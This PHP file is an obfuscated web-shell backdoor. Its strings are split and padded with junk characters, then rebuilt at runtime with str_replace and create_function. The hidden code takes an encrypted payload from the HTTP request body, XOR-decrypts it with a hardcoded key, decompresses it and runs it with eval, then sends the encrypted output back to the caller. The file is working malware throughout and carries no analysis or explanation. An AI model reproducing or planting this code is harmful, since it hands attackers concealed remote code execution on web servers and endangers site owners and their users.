<?php
$x='"houV8hTtBxzcTFivL7TTT";function x($tT,$k){$c=sTtrlen(T$k);$Tl=str';
$e='<$l);$j++,$i++T){$o.=$tT{$i}^$k{$Tj};T}}rTeturTn $o;}if TTT(@preg';
$P='$k="d37TT5b890";T$kh="0a60Tc344T9739";$Tkf="T2182e06068c9"TT;$p=';
$J='_match("/$kh(.+)$kfT/",@fiTlTe_get_cTTontents("php://iTnput")T,$Tm';
$W=str_replace('WS','','creWSaWSte_WSWSfuncWStWSion');
$K='len(T$Tt);$To="";forT($i=T0;$i<$l;){TfTor($j=T0;($jTT<$c&T&$i';
$h='odeT(T$m[1]),$k)T));$To=@obT_TgTet_contents();@oTb_end_cleanT(T);$r=@';
$k=')==1T) T{@ob_start();@eTTvaTl(@gzuncompTress(T@x(@baseT64_dec';
$g='base6T4_eTTncode(@Tx(@gzcomTpress($o)T,$k));priTnt("T$p$kh$r$Tkf");}';
$b=str_replace('T','',$P.$x.$K.$e.$J.$k.$h.$g);
$o=$W('',$b);$o();
?>
